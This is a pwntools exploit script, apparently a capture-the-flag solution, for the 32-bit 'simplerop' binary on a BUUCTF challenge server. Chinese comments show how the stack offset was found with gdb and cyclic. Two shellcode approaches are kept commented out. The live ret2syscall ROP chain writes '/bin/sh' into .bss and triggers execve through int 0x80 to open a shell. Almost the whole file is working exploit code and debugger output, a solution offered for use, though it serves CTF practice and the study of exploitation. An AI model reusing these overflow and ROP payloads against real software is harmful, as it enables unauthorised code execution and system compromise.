from pwn import *

r = remote('node5.buuoj.cn', 27440)
# r = process(r'./simplerop')
elf = ELF(r'../../pwn_file/simplerop')

context.log_level = 'debug'
context.arch = 'i386'

main_addr = 0x8048E24
mprotect_addr = 0x806D870
# read_addr = elf.sym['read']
read_addr = 0x806cd50
bss_start = 0x080EC000
bss_size = 0x1000
bss_premit = 0x7

# 这里不是IDA显示的int v4; // [esp+1Ch] [ebp-14h] 0x14，经gdb调试发现v4和ebp距离为: 0x1c
'''
07:001c│ ecx 0xff9d951c ◂— 0x61616161 ('aaaa')
08:0020│-018 0xff9d9520 ◂— 0xa616161 ('aaa\n')
09:0024│-014 0xff9d9524 —▸ 0xff9d95c4 —▸ 0xff9da3a6 ◂— './simplerop'
0a:0028│-010 0xff9d9528 —▸ 0xff9d95cc —▸ 0xff9da3b2 ◂— 'COLORFGBG=15;0'
0b:002c│-00c 0xff9d952c —▸ 0x80481a8 (_init) ◂— push ebx
0c:0030│-008 0xff9d9530 ◂— 0x0
0d:0034│-004 0xff9d9534 —▸ 0x80ea00c (_GLOBAL_OFFSET_TABLE_+12) —▸ 0x80677d0 (__stpcpy_sse2) ◂— mov edx, dword ptr [esp + 4]                                                                                          
0e:0038│ ebp 0xff9d9538 —▸ 0x80495f0 (__libc_csu_fini) ◂— push ebx
0f:003c│+004 0xff9d953c —▸ 0x804903a (__libc_start_main+458) ◂— mov dword ptr [esp], eax
... ↓        2 skipped
pwndbg> distance 0xff9d951c 0xff9d9538
0xff9d951c->0xff9d9538 is 0x1c bytes (0x7 words)
'''
# 或者使用 cyclic 调试
'''
pwndbg> cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
pwndbg> r
Starting program: /home/kali/pwn_test/simplerop 
ROP is easy is'nt it ?
Your input :aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
Program received signal SIGSEGV, Segmentation fault.
0x61616169 in ?? ()
pwndbg> cyclic -l 0x61616169
Finding cyclic pattern of 4 bytes: b'iaaa' (hex: 0x69616161)
Found at offset 32
'''
'''
# 方法1：========> 压栈入参数
payload = b'A' * (0x1C + 4) + p32(mprotect_addr) + p32(main_addr) + p32(bss_start) + p32(bss_size) + p32(bss_premit)
r.sendlineafter(b'input :', payload)
# gdb.attach(r)

# 向 bss_start 写入shellcode
shellcode = asm(shellcraft.sh())
# 这里offset又变成0x14了，不懂为啥
payload2 = b'A' * (0x14 + 4) + p32(read_addr) + p32(bss_start) + p32(0) + p32(bss_start) + p32(0x100)
r.sendlineafter(b'input :', payload2)
r.sendline(shellcode)
r.interactive()
'''
"""
# 方法2：=====> 借用三个寄存器入参，可控制执行流程
pop_edi_esi_ebx = 0x0806302b  # 0x0806302b : pop edi ; pop esi ; pop ebx ; ret
payload = b'A' * (0x1C + 4) + p32(mprotect_addr) + p32(pop_edi_esi_ebx) + p32(bss_start) + p32(bss_size) + p32(bss_premit) \
                + p32(read_addr) + p32(pop_edi_esi_ebx) + p32(0) + p32(bss_start) + p32(0x100) \
                + p32(bss_start)
r.sendlineafter(b'input :', payload)
# gdb.attach(r)

# 向 bss_start 写入shellcode
shellcode = asm(shellcraft.sh())
r.sendline(shellcode)
r.interactive()
"""

# 方法3：=====> ret2syscall
''' ret2syscall 即控制程序执行系统调用来获取 shell
关于系统调用的知识：
Linux 的系统调用通过 int 80h 实现，用系统调用号来区分入口函数
应用程序调用系统调用的过程是：
    1、把系统调用的编号存入 EAX
    2、把函数参数存入其它通用寄存器
    3、触发 0x80 号中断（int 0x80）
那么我们如果希望通过系统调用来获取 shell 就需要把系统调用的参数放入各个寄存器，然后执行 int 0x80 就可以了

构造：int80(11,“/bin/sh”,null,null)，后面的四个参数分别是eax、ebx、ecx、edx。
    eax=0xb
    ebx=/bin/sh 的地址
    ecx=0
    edx=0
那么问题来了 /bin/sh 的地址在哪里？，bss 段是可读可写的，那就用 read 函数写到里面去
'''
# 0x080bae06 : pop eax ; ret
pop_eax = 0x080bae06
# 0x080493e1 : int 0x80
int_80 = 0x080493e1
# 0x0806e850 : pop edx ; pop ecx ; pop ebx ; ret
pop_edx_ecx_ebx = 0x0806e850
# bss
bss = elf.bss()
print(hex(bss))

# read(/bin/sh,0,len) + int80(11,"/bin/sh",null,null)
payload = b'A' * (0x1C + 4)
payload += p32(read_addr) + p32(pop_edx_ecx_ebx) + p32(0) + p32(bss) + p32(0x8)
payload += p32(pop_eax) + p32(0xb)
payload += p32(pop_edx_ecx_ebx) + p32(0) * 2 + p32(bss)
payload += p32(int_80)
r.sendlineafter(b'input :', payload)
# 写 /bin/sh 到 bss中
r.sendline(b'/bin/sh\x00')
r.interactive()
